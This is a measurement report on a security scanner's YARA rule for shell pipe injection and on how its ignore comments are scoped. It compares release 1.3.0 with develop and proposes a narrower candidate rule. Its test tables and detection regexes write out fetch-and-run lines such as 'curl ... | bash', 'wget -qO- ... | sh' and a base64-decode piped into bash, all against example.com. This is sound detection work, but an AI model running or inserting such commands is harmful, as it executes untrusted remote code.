# Ignore granularity: how an ignore is scoped, and why a YARA finding has no line

Report only. Nothing in this pull request changes a rule, the scanner's code or its output. It was measured on `origin/develop` at commit `0ddf560` and on the released `bawbel-scanner` 1.3.0 (PyPI, uploaded 2026-06-27), with yara-python 4.5.4 and Python 3.12.13, on 2026-11-26. Choosing among the options below is the maintainer's decision, and none is implemented here.

## Summary

- **The rule as first reported is the released one.** Release 1.3.0 has `AVE_ShellPipeInjection` as ten literal substrings, including `| python`, `| pip` and `| npm`. `develop` already differs: since #98 (commit `6b478b9`, not in `CHANGELOG.md` and not in any release, because PyPI's latest is 1.3.0) a pipe into an interpreter counts only after a fetch or a decode on the same line. On the same 5274 real files the rule of 1.3.0 matched 60 and the rule on `develop` matched 2 (section 1).
- **The `| python3` false positive is reproduced on 1.3.0 and not on `develop`.** The 1.3.0 substring `| npm` also matched the shell's `||` operator, in 58 `package.json` files (section 1).
- **How an ignore is scoped depends on the form (section 2).** A plain inline ignore applies to the line it is on. A justified ignore (one with `reason:`) applies to a whole file for one rule or AVE id and never reads the line. A `.bawbelignore` glob applies to a whole file. For a finding with no line, which is every finding from the YARA engine, **a plain inline ignore and a block ignore have no effect at all**; only the justified form and `.bawbelignore` suppress it, for the whole file. The task's wording ("a `bawbel-ignore: <rule>` covers the whole file") is true only for the justified form.
- **A line ignore reaches only the first matching line (section 3).** Findings are deduplicated to one per rule id before suppression. When a rule matches two lines, the finding is the first, an ignore on the second does nothing, and an ignore on the first hides the second.
- **YARA does report where a match is (section 4).** yara-python gives each string instance an `offset`, a `matched_length` and the matched bytes. The engine reads the first instance's text for the finding and sets `line=None`. Turning an offset into a line took 4 ms for 2000 instances in a 4 MB file. Today a YARA finding is `line: null` in JSON and `startLine: 1` in SARIF, while its match is on line 6 in the file measured.
- **The rule can be narrowed further without losing a case a test pins (section 6).** A candidate, measured in a scratch copy only, keeps all 985 tests passing and adds no hit on the 5274 real files, gains three variants that `develop` lost, and stops matching `eval $(ssh-agent -s)`. Two limits remain.

## 1. The rule: released 1.3.0 and `develop`

Release 1.3.0, read from its published sdist:

```text
$pipe1 "curl | bash"   $pipe2 "curl|bash"   $pipe3 "wget | bash"   $pipe4 "wget|bash"   $pipe5 "wget | sh"   $pipe6 "curl | sh"
$pipe7 "| python"      $pipe8 "| pip"       $pipe9 "| npm"         $pipe10 "eval $("      (all nocase; any one matches)
```

`develop`: the first six and `$pipe10` are unchanged, and `$pipe7` to `$pipe9` are replaced by two regular expressions. `$pipe_fetch` is `curl` or `wget`, then up to 300 characters with no newline and no pipe, then a pipe into `python`, `pip`, `npm`, `npx`, `node`, `perl`, `ruby`, `bash`, `sh` or `zsh`. `$pipe_decode` is `base64 -d` (or `-D`, `--decode`) then a pipe into an interpreter.

One harmless line per row, scanned as the YARA rule alone (a hit means `AVE_ShellPipeInjection` matched). The rows marked T should match, F should not, and M are variants the old substring happened to catch:

| | Line | 1.3.0 | `develop` | Candidate (scratch) |
|---|---|:-:|:-:|:-:|
| T1 | `curl -s https://example.com/install.sh \| bash` | - | hit | hit |
| T2 | `curl -fsSL https://example.com/x \| python3` | hit | hit | hit |
| T3 | `wget -qO- https://example.com/x \| sh` | - | hit | hit |
| T4 | `echo aGVsbG8= \| base64 -d \| bash` | - | hit | hit |
| T5 | `eval $(curl -s https://example.com/env)` | hit | hit | hit |
| F1 | `cat data.json \| python3 -c '...'` | hit | - | - |
| F2 | `grep -v '^#' requirements.in \| pip install -r /dev/stdin` | hit | - | - |
| F3 | `echo y \| npm init` | hit | - | - |
| F4 | `printf '%s' "$PAYLOAD" \| python -m json.tool` | hit | - | - |
| F5 | `eval $(ssh-agent -s)` | hit | hit | - |
| F6 | `"prepublish": "not-in-publish \|\| npm run prepublishOnly"` | hit | - | - |
| M1 | `http GET https://example.com/x \| python3` | hit | - | - |
| M2 | `Invoke-WebRequest https://example.com/x \| python3` | hit | - | hit |
| M3 | `curl -fsSL https://example.com/x \` newline `\| python3` | hit | - | hit |
| M4 | `curl -fsSL https://example.com/x \` newline `\| bash` | - | - | hit |
| N1 | `curl -s -L https://example.com/data \| perl -lne '...'` | - | hit | hit |

Compared with 1.3.0, `develop` gains T1, T3 and T4, and stops matching F1 to F4 and F6. It loses M1, M2 and M3. F5 still matches, and so does N1, a download piped through `perl -lne '...'` as a text filter, which is the one outside hit besides this scanner's own rule file in the corpus run below.

**On real files.** Only the YARA rule, on 5274 files of types the scanner lists (`.md`, `.json`, `.yaml`, `.yml`, `.txt`, `.toml`, `.markdown`) from the packages of a Semgrep test environment, the system Python packages, `/usr/share` and the YARA and Magika test targets, read only:

```text
1.3.0     60 files: 58 package.json (the string $pipe9, matching the "||" operator in  "x || npm run y"), 1 .md ($pipe7), 1 .yaml ($pipe2, $pipe4)
develop    2 files: this scanner's own Semgrep rule file (it contains attack text by design) and one data file in nmap
           (a comment that downloads a table and filters it with  perl -lne '...')
time       0.8 s for each version over all the files
```

**On the existing tests.** `tests/unit/engines/test_yara_shell_pipe_rule.py` (added by #98) pins 8 lines that must match and 4 that must not. The whole suite in the YARA image: `develop`, 985 passed, 1 skipped, 2 xfailed. With the rule file of 1.3.0 put back in a scratch copy: 12 failed. Eight are in that file (four lines that must match, all four that must not) and four are in `test_yara_network_recon_rule.py`, which is a different rule that also changed after 1.3.0 and is restored by the swap. The tests do not cover M1 to M4, N1 or `eval $(ssh-agent -s)`.

## 2. How an ignore is scoped today

Each case is a small harmless file run through `scan()` on `develop` with the pattern and YARA engines. A finding only the YARA rule produces (`curl -s ... | bash`, a `curl` with flags, which the pattern rule does not match) is `yara:AVE_ShellPipeInjection@None`. A finding the pattern rule produces is `pattern:bawbel-shell-pipe@N`.

| Mechanism | Syntax | A finding with a line (pattern engine) | A finding with no line (YARA engine) |
|---|---|---|---|
| Inline | `<!-- bawbel-ignore -->` or `<!-- bawbel-ignore: ID -->` | applies if the finding's line is the comment's line | **no effect** |
| Block | `<!-- bawbel-ignore-start -->` ... `<!-- bawbel-ignore-end -->` | applies to the lines inside | **no effect** |
| Justified | `<!-- bawbel-ignore: ID reason: ... -->` (also what `bawbel accept` is for, not run here) | the whole file, for that rule id or AVE id, whatever line the comment or the finding is on | the whole file, for that rule id or AVE id |
| `.bawbelignore` | a path glob | the whole file | the whole file |

Measured, for one finding of `AVE-2026-00004` per case:

```text
a file whose two pipe lines only the YARA rule matches:
  no ignore                                   active    yara@None                     one finding for the file, for two matching lines
  plain inline on line 3, by AVE id           active    yara@None                     not suppressed
  plain inline on line 3, no id               active    yara@None                     not suppressed
  block around line 3                         active    yara@None                     not suppressed
  justified inline on line 3                  suppressed yara@None                    the whole file
  .bawbelignore matching the file             suppressed yara@None                    the whole file

a file with a pipe on line 3 that only YARA matches and one on line 7 that the pattern rule matches:
  justified inline on line 3                  suppressed pattern@7                    suppresses the finding on line 7: the justified form does not read the line
```

`apply_suppressions` and `_is_suppressed` in `scanner/suppression/inline.py` apply the inline and block forms only when `finding.line is not None`. `apply_justified_suppressions` in `scanner/suppression/justified.py` looks a finding up by its AVE id or rule id and does not read its line, although `AcceptedFinding` stores the line of its comment. `tests/test_scanner.py::test_block_suppression_still_works` records the exemption as known ("YARA line=None findings are exempt") and asserts only on pattern findings.

## 3. One finding per rule, before suppression

`deduplicate` keeps one finding per rule id (the highest severity, else the first), then one per AVE id. Between two findings for the same AVE id, one with a line beats one without, and otherwise the engine order decides (`pattern` 0, `yara` 1, `semgrep` 2, `llm` 3, `sandbox` 4). `scan()` deduplicates before it applies suppressions. So even for a pattern finding the ignore is not scoped to "the line it is on" in the way a reader would expect. Two lines that the pattern rule matches, 3 and 7, and an inline ignore for `AVE-2026-00004`:

```text
both lines, no ignore             active=[pattern@3]
ignore on the first line (3)      active=[]            suppressed=[pattern@3]   the line 7 occurrence is never reported
ignore on the second line (7)     active=[pattern@3]                            the ignore has no effect
ignore on both lines              active=[]            suppressed=[pattern@3]
```

Because a YARA finding has no line, the same collapse also decides which finding survives: in the first measurement a file with a pattern finding and a YARA finding for AVE-2026-00004 showed only the pattern finding, and the YARA match never appeared.

## 4. A YARA match has an offset, and the finding discards it

`scanner/engines/yara_engine.py` reads `match.strings[0].instances[0]` for the finding's `match` text and sets `line=None`. yara-python 4.5.4 gives, for each instance of each string, `offset`, `matched_length` and `matched_data`. On a small file with three strings that matched:

```text
$pipe_fetch   offset=25  length=41  line 3   b'curl -s https://example.com/one.sh | bash'
$pipe_decode  offset=99  length=16  line 5   b'base64 -d | bash'
$pipe10       offset=123 length=7   line 7   b'eval $('
```

- **The offset is in bytes.** The engine scans the text as UTF-8 bytes. A line computed by counting `\n` in the str up to the byte offset is wrong when non-ASCII text comes first: with 60 `é` characters on a line before a match on line 3, the byte offset used as a character index gives line 4. The line has to be counted in the bytes: `data.count(b"\n", 0, offset) + 1`.
- **The line numbers stay aligned.** The engine already scans the text after code fences are blanked, which keeps the line count, as its own comment says.
- **Cost.** In a 4.0 MB input with 2000 matching lines, YARA took 28 ms and mapping all 2000 offsets to lines took 4 ms (a list of newline offsets built once, a bisect for each hit).
- **Output today.** A finding that only YARA produced is `"line": null` in JSON, and `startLine: 1` in SARIF, because the formatter uses `f.line or 1`. Its match was on line 6 of the file.

## 5. What it would take to scope an ignore to a line or a text span

| Option | What changes | What it does to existing output | Measured or not |
|---|---|---|---|
| **O1. Report the first instance's line.** | `yara_engine.py` sets `line` from the first instance's offset, counted in bytes | The plain inline and the block ignore start to apply to YARA findings, which today they silently do not. JSON `line` and SARIF `startLine` become the real line for those findings. A YARA finding now has a line, so the dedup preference "has a line" no longer picks a pattern finding over it, and the engine order (`pattern` first) decides | Cost measured (section 4). The effect on the golden fixture and on the toxic-flow results was not run |
| **O2. One finding per instance.** | The YARA engine emits one finding per instance. The dedup key changes from the rule id to the rule id and the line, or the collapse in section 3 stays and only the first is ever seen | More findings for the same rule in a file. The risk score is the maximum, so it does not change by count. The pattern engine already finds every line and `deduplicate` throws all but the first away, so this needs the same change for both engines to mean anything | Not measured |
| **O3. A text span.** | Additive fields on a finding for the start and end (an offset and a length, or a column range), in JSON, and `region.startColumn` and `endColumn` in SARIF. A new ignore syntax that names the text, for example the matched text | New fields only. A span ignore matched on text is more precise than a line and a larger surface to document, and the `match` field is already truncated to 80 characters | Not measured. The offset and length are available (section 4) |
| **O4. A line scope for the justified form.** | An explicit scope in the comment, for example a `scope: line`, read by `apply_justified_suppressions`, which already has the comment's line | Today the justified form is the whole file for a rule by design. Making line the default would change what every existing accepted entry covers, so the default would stay the whole file | Not measured |

O1 alone makes the line ignores that people may already have written start to work for YARA findings, and the dedup collapse in section 3 still limits every line ignore to the first matching line of a rule.

## 6. Can the rule be tightened without losing the cases it exists for

The cases a test pins are the 8 and 4 lines in `test_yara_shell_pipe_rule.py`. The record's own `example_patterns`, in the pinned corpus, are empty for AVE-2026-00004 (it is one of the 40 records without examples), so there is nothing else of the record's own to keep.

A **candidate** rule was written in a scratch copy and is not committed:

```text
$pipe_fetch  /(curl|wget|Invoke-WebRequest|iwr)([^\n|]|\\\n){0,300}\|\s*(sudo\s+)?(python[0-9.]*|pip[0-9]*|npm|npx|node|perl|ruby|bash|sh|zsh)\b/ nocase
$pipe10      /eval\s+\$\(\s*(curl|wget)/ nocase
```

That is `develop`'s regular expression with a PowerShell fetcher added, with a backslash and a newline allowed inside the gap so a pipe on the next line of a continued command still counts, and with `eval $(` counted only when a fetch follows. Results:

- The table in section 1, column "Candidate": M2, M3 and M4 now match, F5 stops matching, and everything else is as in `develop`.
- The existing suite with the candidate rule file: 985 passed, 1 skipped, 2 xfailed, the same as `develop`.
- The 5274 real files: the same 2 hits as `develop`, and 0.9 s.

Two limits remain and are not closed by this candidate. M1 (`http GET` and other fetchers that are not `curl`, `wget` or PowerShell) is not matched, and a fetch that is piped into an interpreter running a script from its own arguments, such as `perl -lne '...'` in N1, still matches, because `curl x | python3 -c "...exec(sys.stdin.read())"` is a real attack and cannot be told from a filter without parsing the command. Both are decisions about meaning, which this task does not make.

## 7. How this was measured

Scratch directories and throwaway containers, `origin/develop` read from a checkout, and the released 1.3.0 installed into a scratch directory (`pip install bawbel-scanner[yara]==1.3.0`) and run with the network disabled. The measurement scripts are not committed; each number above comes from their output:

- the case table: each line written alone as a `SKILL.md`, once through `scan()` and once through the YARA rule file directly;
- the ignore scope runs: small files with each form, through `scan()` with the pattern and YARA engines;
- the real-file runs: the YARA rule files compiled with yara-python 4.5.4 and matched over each file's bytes;
- the suite runs: `pytest tests` in the YARA image, with the rule file swapped in a copy of the tree;
- the offset runs: `rules.match(data=...)` and the instances of each matched string.

## 8. Not verified

- `bawbel accept`, `--watch`, and the toxic-flow and false-positive stages after an ignore. Only `scan()` was run.
- Other YARA rules. Every YARA finding has `line=None` today, so the line and ignore behaviour in sections 2 to 4 applies to all of them, but only this rule was run.
- Windows and macOS, and line endings other than `\n`. The offset count assumed `\n`.
- The effect of O1 to O4 on the golden fixture, on the output contract tests and on consumers of the JSON `line`.
- That the candidate is the right narrowing. It was checked against the tests that exist and against 5274 real files, which hold few real instances of the attack.
